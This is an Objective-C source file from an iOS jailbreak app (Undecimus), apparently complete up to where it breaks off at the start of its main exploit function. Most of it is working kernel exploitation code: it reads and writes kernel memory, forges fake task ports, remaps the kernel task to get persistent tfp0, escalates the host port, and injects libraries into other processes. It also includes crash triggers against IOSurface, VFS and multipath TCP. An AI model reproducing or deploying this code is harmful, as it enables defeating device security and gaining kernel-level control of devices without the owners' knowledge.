//
//  ViewController.m
//  Undecimus
//
//  Created by pwn20wnd on 8/29/18.
//  Copyright © 2018 Pwn20wnd. All rights reserved.
//

#include <sys/snapshot.h>
#include <dlfcn.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <copyfile.h>
#include <spawn.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <libgen.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <dirent.h>
#include <sys/sysctl.h>
#import "ViewController.h"
#include "common.h"
#include "offsets.h"
#include "empty_list_sploit.h"
#include "kmem.h"
#include "patchfinder64.h"
#include "kexecute.h"
#include "kutils.h"
extern int (*_system)(const char *);
#include "libjb.h"
#include "remote_memory.h"
#include "remote_call.h"
#include "QiLin.h"
#include "iokit.h"
#include "unlocknvram.h"
#include "SettingsTableViewController.h"
#include "untar.h"
#include "multi_path_sploit.h"
#include "async_wake.h"

@interface ViewController ()

@end

@implementation ViewController
static ViewController *sharedController = nil;

#define PROGRESS(msg, btnenbld, tbenbld) do { \
        dispatch_async(dispatch_get_main_queue(), ^{ \
            [UIView performWithoutAnimation:^{ \
                [[[ViewController sharedController] goButton] setEnabled:btnenbld]; \
                [[[[ViewController sharedController] tabBarController] tabBar] setUserInteractionEnabled:tbenbld]; \
                [[[ViewController sharedController] goButton] setTitle:@(msg) forState: btnenbld ? UIControlStateNormal : UIControlStateDisabled]; \
                [[[ViewController sharedController] goButton] layoutIfNeeded]; \
            }]; \
        }); \
} while (false)

// https://github.com/JonathanSeals/kernelversionhacker/blob/3dcbf59f316047a34737f393ff946175164bf03f/kernelversionhacker.c#L92

#define IMAGE_OFFSET 0x2000
#define MACHO_HEADER_MAGIC 0xfeedfacf
#define MAX_KASLR_SLIDE 0x21000000
#define KERNEL_SEARCH_ADDRESS 0xfffffff007004000

#define ptrSize sizeof(uintptr_t)

static vm_address_t get_kernel_base(mach_port_t tfp0)
{
    uint64_t addr = 0;
    addr = KERNEL_SEARCH_ADDRESS+MAX_KASLR_SLIDE;
    
    while (1) {
        char *buf;
        mach_msg_type_number_t sz = 0;
        kern_return_t ret = vm_read(tfp0, addr, 0x200, (vm_offset_t*)&buf, &sz);
        
        if (ret) {
            goto next;
        }
        
        if (*((uint32_t *)buf) == MACHO_HEADER_MAGIC) {
            int ret = vm_read(tfp0, addr, 0x1000, (vm_offset_t*)&buf, &sz);
            if (ret != KERN_SUCCESS) {
                printf("Failed vm_read %i\n", ret);
                goto next;
            }
            
            for (uintptr_t i=addr; i < (addr+0x2000); i+=(ptrSize)) {
                mach_msg_type_number_t sz;
                int ret = vm_read(tfp0, i, 0x120, (vm_offset_t*)&buf, &sz);
                
                if (ret != KERN_SUCCESS) {
                    printf("Failed vm_read %i\n", ret);
                    exit(-1);
                }
                if (!strcmp(buf, "__text") && !strcmp(buf+0x10, "__PRELINK_TEXT")) {
                    return addr;
                }
            }
        }
        
    next:
        addr -= 0x200000;
    }
}

int sha1_to_str(const unsigned char *hash, int hashlen, char *buf, size_t buflen)
{
    if (buflen < (hashlen*2+1)) {
        return -1;
    }
    
    int i;
    for (i=0; i<hashlen; i++) {
        sprintf(buf+i*2, "%02X", hash[i]);
    }
    buf[i*2] = 0;
    return ERR_SUCCESS;
}

char *copyBootHash(void)
{
    io_registry_entry_t chosen = IORegistryEntryFromPath(kIOMasterPortDefault, "IODeviceTree:/chosen");
    
    if (!MACH_PORT_VALID(chosen)) {
        printf("Unable to get IODeviceTree:/chosen port\n");
        return NULL;
    }
    
    CFDataRef hash = (CFDataRef)IORegistryEntryCreateCFProperty(chosen, CFSTR("boot-manifest-hash"), kCFAllocatorDefault, 0);
    
    IOObjectRelease(chosen);
    
    if (hash == nil) {
        fprintf(stderr, "Unable to read boot-manifest-hash\n");
        return NULL;
    }
    
    if (CFGetTypeID(hash) != CFDataGetTypeID()) {
        fprintf(stderr, "Error hash is not data type\n");
        CFRelease(hash);
        return NULL;
    }
    
    // Make a hex string out of the hash
    
    CFIndex length = CFDataGetLength(hash) * 2 + 1;
    char *manifestHash = (char*)calloc(length, sizeof(char));
    
    int ret = sha1_to_str(CFDataGetBytePtr(hash), (int)CFDataGetLength(hash), manifestHash, length);
    
    CFRelease(hash);
    
    if (ret != ERR_SUCCESS) {
        printf("Unable to generate bootHash string\n");
        free(manifestHash);
        return NULL;
    }
    
    return manifestHash;
}

#define APPLESNAP "com.apple.os.update-"

const char *systemSnapshot()
{
    char *BootHash = copyBootHash();
    _assert(BootHash != NULL);
    const char *SystemSnapshot = [[NSString stringWithFormat:@APPLESNAP @"%s", BootHash] UTF8String];
    free(BootHash);
    return SystemSnapshot;
}

uint64_t
find_gadget_candidate(
                      char** alternatives,
                      size_t gadget_length)
{
    void* haystack_start = (void*)atoi;    // will do...
    size_t haystack_size = 100*1024*1024; // likewise...
    
    for (char* candidate = *alternatives; candidate != NULL; alternatives++) {
        void* found_at = memmem(haystack_start, haystack_size, candidate, gadget_length);
        if (found_at != NULL){
            printf("found at: %llx\n", (uint64_t)found_at);
            return (uint64_t)found_at;
        }
    }
    
    return 0;
}

uint64_t blr_x19_addr = 0;
uint64_t
find_blr_x19_gadget()
{
    if (blr_x19_addr != 0){
        return blr_x19_addr;
    }
    char* blr_x19 = "\x60\x02\x3f\xd6";
    char* candidates[] = {blr_x19, NULL};
    blr_x19_addr = find_gadget_candidate(candidates, 4);
    return blr_x19_addr;
}

int inject_library(pid_t pid, const char *path)
{
    mach_port_t task_port = MACH_PORT_NULL;
    kern_return_t ret = KERN_FAILURE;
    ret = task_for_pid(mach_task_self(), pid, &task_port);
    if (!(MACH_PORT_VALID(task_port) && ret == KERN_SUCCESS))
        task_port = task_for_pid_workaround(pid);
    _assert(MACH_PORT_VALID(task_port));
    call_remote(task_port, dlopen, 2, REMOTE_CSTRING(path), REMOTE_LITERAL(RTLD_NOW));
    uint64_t error = call_remote(task_port, dlerror, 0);
    _assert(error == 0);
    return 0;
}

size_t
kread(uint64_t where, void *p, size_t size)
{
    int rv;
    size_t offset = 0;
    while (offset < size) {
        mach_vm_size_t sz, chunk = 2048;
        if (chunk > size - offset) {
            chunk = size - offset;
        }
        rv = mach_vm_read_overwrite(tfp0, where + offset, chunk, (mach_vm_address_t)p + offset, &sz);
        if (rv || sz == 0) {
            fprintf(stderr, "[e] error reading kernel @%p\n", (void *)(offset + where));
            break;
        }
        offset += sz;
    }
    return offset;
}

size_t
kwrite(uint64_t where, const void *p, size_t size)
{
    int rv;
    size_t offset = 0;
    while (offset < size) {
        size_t chunk = 2048;
        if (chunk > size - offset) {
            chunk = size - offset;
        }
        rv = mach_vm_write(tfp0, where + offset, (mach_vm_offset_t)p + offset, (mach_msg_type_number_t)chunk);
        if (rv) {
            fprintf(stderr, "[e] error writing kernel @%p\n", (void *)(offset + where));
            break;
        }
        offset += chunk;
    }
    return offset;
}

// thx Siguza
typedef struct {
    uint64_t prev;
    uint64_t next;
    uint64_t start;
    uint64_t end;
} kmap_hdr_t;

uint64_t zm_fix_addr(uint64_t addr, uint64_t zone_map_ref) {
    static kmap_hdr_t zm_hdr = {0, 0, 0, 0};
    if (zm_hdr.start == 0) {
        // xxx rk64(0) ?!
        // uint64_t zone_map_ref = find_zone_map_ref();
        fprintf(stderr, "zone_map_ref: %llx \n", zone_map_ref);
        uint64_t zone_map = rk64(zone_map_ref);
        fprintf(stderr, "zone_map: %llx \n", zone_map);
        // hdr is at offset 0x10, mutexes at start
        size_t r = kread(zone_map + 0x10, &zm_hdr, sizeof(zm_hdr));
        fprintf(stderr, "zm_range: 0x%llx - 0x%llx (read 0x%zx, exp 0x%zx)\n", zm_hdr.start, zm_hdr.end, r, sizeof(zm_hdr));
        
        if (r != sizeof(zm_hdr) || zm_hdr.start == 0 || zm_hdr.end == 0) {
            fprintf(stderr, "kread of zone_map failed!\n");
            exit(1);
        }
        
        if (zm_hdr.end - zm_hdr.start > 0x100000000) {
            fprintf(stderr, "zone_map is too big, sorry.\n");
            exit(1);
        }
    }
    
    uint64_t zm_tmp = (zm_hdr.start & 0xffffffff00000000) | ((addr) & 0xffffffff);
    
    return zm_tmp < zm_hdr.start ? zm_tmp + 0x100000000 : zm_tmp;
}

uint32_t IO_BITS_ACTIVE = 0x80000000;
uint32_t IKOT_TASK = 2;
uint32_t IKOT_NONE = 0;

void convert_port_to_task_port(mach_port_t port, uint64_t space, uint64_t task_kaddr) {
    // now make the changes to the port object to make it a task port:
    uint64_t port_kaddr = getAddressOfPort(getpid(), port);
    
    wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_BITS_ACTIVE | IKOT_TASK);
    wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES), 0xf00d);
    wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS), 0xf00d);
    wk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), space);
    wk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT),  task_kaddr);
    
    // swap our receive right for a send right:
    uint64_t task_port_addr = task_self_addr();
    uint64_t task_addr = rk64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    uint64_t itk_space = rk64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
    uint64_t is_table = rk64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
    
    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    uint32_t bits = rk32(is_table + (port_index * sizeof_ipc_entry_t) + 8); // 8 = offset of ie_bits in struct ipc_entry
    
#define IE_BITS_SEND (1<<16)
#define IE_BITS_RECEIVE (1<<17)
    
    bits &= (~IE_BITS_RECEIVE);
    bits |= IE_BITS_SEND;
    
    wk32(is_table + (port_index * sizeof_ipc_entry_t) + 8, bits);
}

void make_port_fake_task_port(mach_port_t port, uint64_t task_kaddr) {
    convert_port_to_task_port(port, ipc_space_kernel(), task_kaddr);
}

uint64_t make_fake_task(uint64_t vm_map) {
    uint64_t fake_task_kaddr = kmem_alloc(0x1000);
    
    void* fake_task = malloc(0x1000);
    memset(fake_task, 0, 0x1000);
    *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_REF_COUNT)) = 0xd00d; // leak references
    *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_ACTIVE)) = 1;
    *(uint64_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP)) = vm_map;
    *(uint8_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE)) = 0x22;
    kmemcpy(fake_task_kaddr, (uint64_t) fake_task, 0x1000);
    free(fake_task);
    
    return fake_task_kaddr;
}

// Stek29's code.

kern_return_t mach_vm_remap(vm_map_t dst, mach_vm_address_t *dst_addr, mach_vm_size_t size, mach_vm_offset_t mask, int flags, vm_map_t src, mach_vm_address_t src_addr, boolean_t copy, vm_prot_t *cur_prot, vm_prot_t *max_prot, vm_inherit_t inherit);
int remap_tfp0_set_hsp4(mach_port_t *port, uint64_t zone_map_ref) {
    // huge thanks to Siguza for hsp4 & v0rtex
    // for explainations and being a good rubber duck :p
    
    // see https://github.com/siguza/hsp4 for some background and explaination
    // tl;dr: there's a pointer comparison in convert_port_to_task_with_exec_token
    //   which makes it return TASK_NULL when kernel_task is passed
    //   "simple" vm_remap is enough to overcome this.
    
    // However, vm_remap has weird issues with submaps -- it either doesn't remap
    // or using remapped addresses leads to panics and kittens crying.
    
    // tasks fall into zalloc, so src_map is going to be zone_map
    // zone_map works perfectly fine as out zone -- you can
    // do remap with src/dst being same and get new address
    
    // however, using kernel_map makes more sense
    // we don't want zalloc to mess with our fake task
    // and neither
    
    // proper way to use vm_* APIs from userland is via mach_vm_*
    // but those accept task ports, so we're gonna set up
    // fake task, which has zone_map as its vm_map
    // then we'll build fake task port from that
    // and finally pass that port both as src and dst
    
    // last step -- wire new kernel task -- always a good idea to wire critical
    // kernel structures like tasks (or vtables :P )
    
    // and we can write our port to realhost.special[4]
    
    // we can use mach_host_self() if we're root
    mach_port_t host_priv = fake_host_priv();
    
    int ret;
    uint64_t remapped_task_addr = 0;
    // task is smaller than this but it works so meh
    uint64_t sizeof_task = 0x1000;
    
    uint64_t kernel_task_kaddr;
    
    {
        // find kernel task first
        kernel_task_kaddr = rk64(task_self_addr() + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
        
        while (kernel_task_kaddr != 0) {
            uint64_t bsd_info = rk64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
            
            uint32_t pid = rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
            
            if (pid == 0) {
                break;
            }
            
            kernel_task_kaddr = rk64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_PREV));
        }
        
        if (kernel_task_kaddr == 0) {
            printf("[remap_kernel_task] failed to find kernel task\n");
            return 1;
        }
        
        printf("[remap_kernel_task] kernel task at 0x%llx\n", kernel_task_kaddr);
    }
    
    mach_port_t zm_fake_task_port = MACH_PORT_NULL;
    mach_port_t km_fake_task_port = MACH_PORT_NULL;
    ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &zm_fake_task_port);
    ret = ret || mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &km_fake_task_port);
    
    if (ret == KERN_SUCCESS && *port == MACH_PORT_NULL) {
        ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, port);
    }
    
    if (ret != KERN_SUCCESS) {
        printf("[remap_kernel_task] unable to allocate ports: 0x%x (%s)\n", ret, mach_error_string(ret));
        return 1;
    }
    
    // strref \"Nothing being freed to the zone_map. start = end = %p\\n\"
    // or traditional \"zone_init: kmem_suballoc failed\"
    uint64_t zone_map_kptr = zone_map_ref;
    uint64_t zone_map = rk64(zone_map_kptr);
    
    // kernel_task->vm_map == kernel_map
    uint64_t kernel_map = rk64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_VM_MAP));
    
    uint64_t zm_fake_task_kptr = make_fake_task(zone_map);
    uint64_t km_fake_task_kptr = make_fake_task(kernel_map);
    
    make_port_fake_task_port(zm_fake_task_port, zm_fake_task_kptr);
    make_port_fake_task_port(km_fake_task_port, km_fake_task_kptr);
    
    km_fake_task_port = zm_fake_task_port;
    
    vm_prot_t cur, max;
    ret = mach_vm_remap(km_fake_task_port,
                        &remapped_task_addr,
                        sizeof_task,
                        0,
                        VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR,
                        zm_fake_task_port,
                        kernel_task_kaddr,
                        0,
                        &cur, &max,
                        VM_INHERIT_NONE);
    
    
    if (ret != KERN_SUCCESS) {
        printf("[remap_kernel_task] remap failed: 0x%x (%s)\n", ret, mach_error_string(ret));
        return 1;
    }
    
    if (kernel_task_kaddr == remapped_task_addr) {
        printf("[remap_kernel_task] remap failure: addr is the same after remap\n");
        return 1;
    }
    
    printf("[remap_kernel_task] remapped successfully to 0x%llx\n", remapped_task_addr);
    
    ret = mach_vm_wire(host_priv, km_fake_task_port, remapped_task_addr, sizeof_task, VM_PROT_READ | VM_PROT_WRITE);
    
    if (ret != KERN_SUCCESS) {
        printf("[remap_kernel_task] wire failed: 0x%x (%s)\n", ret, mach_error_string(ret));
        return 1;
    }
    
    uint64_t port_kaddr = getAddressOfPort(getpid(), *port);
    printf("[remap_kernel_task] port kaddr: 0x%llx\n", port_kaddr);
    
    make_port_fake_task_port(*port, remapped_task_addr);
    
    if (rk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) != remapped_task_addr) {
        printf("[remap_kernel_task] read back tfpzero kobject didnt match!\n");
        return 1;
    }
    
    // lck_mtx -- arm: 8  arm64: 16
    const int offsetof_host_special = 0x10;
    uint64_t host_priv_kaddr = getAddressOfPort(getpid(), mach_host_self());
    uint64_t realhost_kaddr = rk64(host_priv_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    wk64(realhost_kaddr + offsetof_host_special + 4 * sizeof(void*), port_kaddr);
    
    return 0;
}

// https://stackoverflow.com/a/47195924
char *readFile(char *filename) {
    FILE *f = fopen(filename, "rt");
    _assert(f);
    fseek(f, 0, SEEK_END);
    long length = ftell(f);
    fseek(f, 0, SEEK_SET);
    char *buffer = (char *) malloc(length + 1);
    buffer[length] = '\0';
    fread(buffer, 1, length, f);
    fclose(f);
    return buffer;
}

void blockDomainWithName(char *name) {
    char *hostsFile = readFile("/etc/hosts");
    _assert(hostsFile);
    char *newLine = malloc(sizeof(char *) + (14 + sizeof(name)));
    bzero(newLine, sizeof(char *) + (14 + sizeof(name)));
    sprintf(newLine, "\n127.0.0.1 %s\n", name);
    if (strstr(hostsFile, newLine)) return;
    FILE *f = fopen("/etc/hosts", "a");
    _assert(f);
    fprintf(f, "%s\n", newLine);
    fclose(f);
}

// https://github.com/JonathanSeals/kernelversionhacker/blob/3dcbf59f316047a34737f393ff946175164bf03f/kernelversionhacker.c#L92

#define DEFAULT_VERSION_STRING "Hacked"
int updateVersionString(char *newVersionString, mach_port_t tfp0, vm_address_t kernel_base) {
    uintptr_t versionPtr = 0;
    struct utsname u = {0};
    uname(&u);
    
    uintptr_t darwinTextPtr = 0;
    
    char *buf = NULL;
    
    vm_size_t sz;
    uintptr_t TEXT_const = 0;
    uint32_t sizeofTEXT_const = 0;
    uintptr_t DATA_data = 0;
    uint32_t sizeofDATA_data = 0;
    
    char *sectName = "__const";
    
    for (uintptr_t i=kernel_base; i < (kernel_base+0x2000); i+=(ptrSize)) {
        int ret = vm_read(tfp0, i, 0x150, (vm_offset_t*)&buf, (mach_msg_type_number_t*)&sz);
        if (ret != KERN_SUCCESS) {
            printf("Failed vm_read %i\n", ret);
            exit(-1);
        }
        
        if (!strcmp(buf, sectName) && !strcmp(buf+0x10, "__TEXT")) {
            TEXT_const = *(uintptr_t*)(buf+0x20);
            sizeofTEXT_const = (uint32_t)*(uintptr_t*)(buf+(0x20 + ptrSize));
            
        }
        
        else if (!strcmp(buf, "__data") && !strcmp(buf+0x10, "__DATA")) {
            DATA_data = *(uintptr_t*)(buf+0x20);
            sizeofDATA_data = (uint32_t)*(uintptr_t*)(buf+(0x20 + ptrSize));
        }
        
        if (TEXT_const && sizeofTEXT_const && DATA_data && sizeofDATA_data)
            break;
    }
    
    if (!(TEXT_const && sizeofTEXT_const && DATA_data && sizeofDATA_data)) {
        printf("Error parsing kernel macho\n");
        return -1;
    }
    
    for (uintptr_t i = TEXT_const; i < (TEXT_const+sizeofTEXT_const); i += 2)
    {
        int ret = vm_read_overwrite(tfp0, i, strlen("Darwin Kernel Version"), (vm_address_t)buf, &sz);
        if (ret != KERN_SUCCESS) {
            printf("Failed vm_read %i\n", ret);
            return -1;
        }
        if (!memcmp(buf, "Darwin Kernel Version", strlen("Darwin Kernel Version"))) {
            darwinTextPtr = i;
            break;
        }
    }
    
    if (!darwinTextPtr) {
        printf("Error finding Darwin text\n");
        return -1;
    }
    
    uintptr_t versionTextXref[ptrSize];
    versionTextXref[0] = darwinTextPtr;
    
    for (uintptr_t i = DATA_data; i < (DATA_data+sizeofDATA_data); i += ptrSize) {
        int ret = vm_read_overwrite(tfp0, i, ptrSize, (vm_address_t)buf, &sz);
        if (ret != KERN_SUCCESS) {
            printf("Failed vm_read %i\n", ret);
            return -1;
        }
        
        if (!memcmp(buf, versionTextXref, ptrSize)) {
            versionPtr = i;
            break;
        }
    }
    
    if (!versionPtr) {
        printf("Error finding _version pointer, did you already patch it?\n");
        return -1;
    }
    
    kern_return_t ret;
    vm_address_t newStringPtr = 0;
    vm_allocate(tfp0, &newStringPtr, strlen(newVersionString), VM_FLAGS_ANYWHERE);
    
    ret = vm_write(tfp0, newStringPtr, (vm_offset_t)newVersionString, (mach_msg_type_number_t)strlen(newVersionString));
    if (ret != KERN_SUCCESS) {
        printf("Failed vm_write %i\n", ret);
        exit(-1);
    }
    
    ret = vm_write(tfp0, versionPtr, (vm_offset_t)&newStringPtr, ptrSize);
    if (ret != KERN_SUCCESS) {
        printf("Failed vm_write %i\n", ret);
        return -1;
    }
    else {
        memset(&u, 0x0, sizeof(u));
        uname(&u);
        return 0;
    }
}

// https://stackoverflow.com/a/779960
// You must free the result if result is non-NULL.
char *str_replace(char *orig, char *rep, char *with) {
    char *result; // the return string
    char *ins;    // the next insert point
    char *tmp;    // varies
    int len_rep;  // length of rep (the string to remove)
    int len_with; // length of with (the string to replace rep with)
    int len_front; // distance between rep and end of last rep
    int count;    // number of replacements
    
    // sanity checks and initialization
    if (!orig || !rep)
        return NULL;
    len_rep = (int)strlen(rep);
    if (len_rep == 0)
        return NULL; // empty rep causes infinite loop during count
    if (!with)
        with = "";
    len_with = (int)strlen(with);
    
    // count the number of replacements needed
    ins = orig;
    for (count = 0; (tmp = strstr(ins, rep)); ++count) {
        ins = tmp + len_rep;
    }
    
    tmp = result = malloc(strlen(orig) + (len_with - len_rep) * count + 1);
    
    if (!result)
        return NULL;
    
    // first time through the loop, all the variable are set correctly
    // from here on,
    //    tmp points to the end of the result string
    //    ins points to the next occurrence of rep in orig
    //    orig points to the remainder of orig after "end of rep"
    while (count--) {
        ins = strstr(orig, rep);
        len_front = (int)(ins - orig);
        tmp = strncpy(tmp, orig, len_front) + len_front;
        tmp = strcpy(tmp, with) + len_with;
        orig += len_front + len_rep; // move to next "end of rep"
    }
    strcpy(tmp, orig);
    return result;
}

uint64_t _vfs_context(uint64_t vfs_context_current, uint64_t zone_map_ref) {
    // vfs_context_t vfs_context_current(void)
    uint64_t vfs_context = kexecute(vfs_context_current, 1, 0, 0, 0, 0, 0, 0);
    vfs_context = zm_fix_addr(vfs_context, zone_map_ref);
    return vfs_context;
}

int _vnode_lookup(uint64_t vnode_lookup, const char *path, int flags, uint64_t *vpp, uint64_t vfs_context){
    size_t len = strlen(path) + 1;
    uint64_t vnode = kmem_alloc(sizeof(uint64_t));
    uint64_t ks = kmem_alloc(len);
    kwrite(ks, path, len);
    int ret = (int)kexecute(vnode_lookup, ks, 0, vnode, vfs_context, 0, 0, 0);
    if (ret != 0) {
        return -1;
    }
    *vpp = rk64(vnode);
    kmem_free(ks, len);
    kmem_free(vnode, sizeof(uint64_t));
    return 0;
}

int _vnode_put(uint64_t vnode_put, uint64_t vnode){
    return (int)kexecute(vnode_put, vnode, 0, 0, 0, 0, 0, 0);
}

uint64_t getVnodeAtPath(uint64_t vfs_context, char *path, uint64_t vnode_lookup){
    uint64_t *vpp = (uint64_t *)malloc(sizeof(uint64_t));
    int ret = _vnode_lookup(vnode_lookup, path, O_RDONLY, vpp, vfs_context);
    if (ret != 0){
        printf("unable to get vnode from path for %s\n", path);
        return -1;
    }
    uint64_t vnode = *vpp;
    free(vpp);
    return vnode;
}

typedef struct val_attrs {
    uint32_t          length;
    attribute_set_t   returned;
    attrreference_t   name_info;
} val_attrs_t;

int snapshot_list(int dirfd)
{
    struct attrlist attr_list = { 0 };
    int total=0;
    
    attr_list.commonattr = ATTR_BULK_REQUIRED;
    
    char *buf = (char*)calloc(2048, sizeof(char));
    int retcount;
    while ((retcount = fs_snapshot_list(dirfd, &attr_list, buf, 2048, 0))>0) {
        total += retcount;
        char *bufref = buf;
        
        for (int i=0; i<retcount; i++) {
            val_attrs_t *entry = (val_attrs_t *)bufref;
            if (entry->returned.commonattr & ATTR_CMN_NAME) {
                printf("%s\n", (char*)(&entry->name_info) + entry->name_info.attr_dataoffset);
            }
            bufref += entry->length;
        }
    }
    free(buf);
    
    if (retcount < 0) {
        perror("fs_snapshot_list");
        return -1;
    }
    
    return total;
}

int message_size_for_kalloc_size(int kalloc_size) {
    return ((3*kalloc_size)/4) - 0x74;
}

void iosurface_die() {
    kern_return_t err;
    
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    
    if (service == IO_OBJECT_NULL){
        printf("unable to find service\n");
        return;
    }
    
    printf("got service port\n");
    
    io_connect_t conn = MACH_PORT_NULL;
    err = IOServiceOpen(service, mach_task_self(), 0, &conn);
    if (err != KERN_SUCCESS){
        printf("unable to get user client connection\n");
        return;
    }
    
    printf("got user client: 0x%x\n", conn);
    
    uint64_t inputScalar[16];
    uint64_t inputScalarCnt = 0;
    
    char inputStruct[4096];
    size_t inputStructCnt = 0x18;
    
    
    uint64_t* ivals = (uint64_t*)inputStruct;
    ivals[0] = 1;
    ivals[1] = 2;
    ivals[2] = 3;
    
    uint64_t outputScalar[16];
    uint32_t outputScalarCnt = 0;
    
    char outputStruct[4096];
    size_t outputStructCnt = 0;
    
    mach_port_t port = MACH_PORT_NULL;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (err != KERN_SUCCESS) {
        printf("failed to allocate new port\n");
        return;
    }
    printf("got wake port 0x%x\n", port);
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    
    uint64_t reference[8] = {0};
    uint32_t referenceCnt = 1;
    
    for (int i = 0; i < 10; i++) {
        err = IOConnectCallAsyncMethod(
                                       conn,
                                       17,
                                       port,
                                       reference,
                                       referenceCnt,
                                       inputScalar,
                                       (uint32_t)inputScalarCnt,
                                       inputStruct,
                                       inputStructCnt,
                                       outputScalar,
                                       &outputScalarCnt,
                                       outputStruct,
                                       &outputStructCnt);
        
        printf("%x\n", err);
    };
    
    return;
}

int vfs_die() {
    int fd = open("/", O_RDONLY);
    if (fd == -1) {
        perror("unable to open fs root\n");
        return 0;
    }
    
    struct attrlist al = {0};
    
    al.bitmapcount = ATTR_BIT_MAP_COUNT;
    al.volattr = 0xfff;
    al.commonattr = ATTR_CMN_RETURNED_ATTRS;
    
    size_t attrBufSize = 16;
    void* attrBuf = malloc(attrBufSize);
    int options = 0;
    
    int err = fgetattrlist(fd, &al, attrBuf, attrBufSize, options);
    printf("err: %d\n", err);
    return 0;
}

#define AF_MULTIPATH 39

int mptcp_die() {
    int sock = socket(AF_MULTIPATH, SOCK_STREAM, 0);
    if (sock < 0) {
        printf("socket failed\n");
        perror("");
        return 0;
    }
    printf("got socket: %d\n", sock);
    
    struct sockaddr* sockaddr_src = malloc(256);
    memset(sockaddr_src, 'A', 256);
    sockaddr_src->sa_len = 220;
    sockaddr_src->sa_family = 'B';
    
    struct sockaddr* sockaddr_dst = malloc(256);
    memset(sockaddr_dst, 'A', 256);
    sockaddr_dst->sa_len = sizeof(struct sockaddr_in6);
    sockaddr_dst->sa_family = AF_INET6;
    
    sa_endpoints_t eps = {0};
    eps.sae_srcif = 0;
    eps.sae_srcaddr = sockaddr_src;
    eps.sae_srcaddrlen = 220;
    eps.sae_dstaddr = sockaddr_dst;
    eps.sae_dstaddrlen = sizeof(struct sockaddr_in6);
    
    int err = connectx(
                       sock,
                       &eps,
                       SAE_ASSOCID_ANY,
                       0,
                       NULL,
                       0,
                       NULL,
                       NULL);
    
    printf("err: %d\n", err);
    
    close(sock);
    
    return 0;
}

#define IO_ACTIVE 0x80000000

#define IKOT_HOST 3
#define IKOT_HOST_PRIV 4

void make_host_into_host_priv() {
    uint64_t hostport_addr = getAddressOfPort(getpid(), mach_host_self());
    uint32_t old = rk32(hostport_addr);
    printf("old host type: 0x%08x\n", old);
    wk32(hostport_addr, IO_ACTIVE | IKOT_HOST_PRIV);
}

mach_port_t try_restore_port() {
    mach_port_t port = MACH_PORT_NULL;
    kern_return_t err;
    err = host_get_special_port(mach_host_self(), 0, 4, &port);
    if (err == KERN_SUCCESS && port != MACH_PORT_NULL) {
        printf("got persisted port!\n");
        // make sure rk64 etc use this port
        return port;
    }
    printf("unable to retrieve persisted port\n");
    return MACH_PORT_NULL;
}

// https://github.com/tihmstar/doubleH3lix/blob/4428c660832e98271f5d82f7a9c67e842b814621/doubleH3lix/jailbreak.mm#L645

extern char* const* environ;
int easyPosixSpawn(NSURL *launchPath,NSArray *arguments) {
    NSMutableArray *posixSpawnArguments=[arguments mutableCopy];
    [posixSpawnArguments insertObject:[launchPath lastPathComponent] atIndex:0];
    
    int argc=(int)posixSpawnArguments.count+1;
    printf("Number of posix_spawn arguments: %d\n",argc);
    char **args=(char**)calloc(argc,sizeof(char *));
    
    for (int i=0; i<posixSpawnArguments.count; i++)
        args[i]=(char *)[posixSpawnArguments[i]UTF8String];
    
    printf("File exists at launch path: %d\n",[[NSFileManager defaultManager]fileExistsAtPath:launchPath.path]);
    printf("Executing %s: %s\n",launchPath.path.UTF8String,arguments.description.UTF8String);
    
    posix_spawn_file_actions_t action;
    posix_spawn_file_actions_init(&action);
    
    pid_t pid;
    int status;
    status = posix_spawn(&pid, launchPath.path.UTF8String, &action, NULL, args, environ);
    
    if (status == 0) {
        if (waitpid(pid, &status, 0) != -1) {
            // wait
        }
    }
    
    posix_spawn_file_actions_destroy(&action);
    free(args);
    
    return status;
}

typedef struct {
    kptr_t trust_chain;
    kptr_t amficache;
    kptr_t OSBoolean_True;
    kptr_t OSBoolean_False;
    kptr_t osunserializexml;
    kptr_t smalloc;
    kptr_t allproc;
    kptr_t add_x0_x0_0x40_ret;
    kptr_t rootvnode;
    kptr_t zone_map_ref;
    kptr_t vfs_context_current;
    kptr_t vnode_lookup;
    kptr_t vnode_put;
} offsets_t;

void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_daemons, int dump_apticket, int run_uicache, char *boot_nonce, int disable_auto_updates, int disable_app_revokes, int overwrite_boot_nonce, int export_kernel_task_port, int restore_rootfs)
{
    // Initialize variables.
    int rv = 0;
    offsets_t offsets = { 0 };
    NSMutableDictionary *md = nil;
